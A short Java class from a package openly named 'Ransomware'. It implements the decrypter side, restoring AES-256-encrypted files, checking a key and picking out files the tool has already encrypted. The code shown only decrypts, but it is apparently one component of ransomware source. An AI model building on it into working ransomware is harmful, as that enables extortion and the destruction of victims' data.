package Ransomware;

import Ransomware.Crypter;
import Ransomware.AES_256;
import java.io.File;
import java.io.IOException;

public class Decrypter extends Crypter {

    public Decrypter(String ext){super(ext);}
    public Decrypter(String ext,String key){
        super(ext,key);
    }
    public File getOutFile(File in){return new File(generatorFilePath.getDecrypted(in));}
    public void doJob(File in, File out, String key){AES_256.decrypt(in,out,key);}
    public boolean checkKey(File folder) throws IOException {
        File[] files = folder.listFiles();
        for(File file : files)
            if(!file.isDirectory()){return AES_256.checkKey(getKey(),file);}
        return false;
    }
    public boolean isCryptableFile(File file){
        return fileFilter.isEncrypted(file);
    }
}
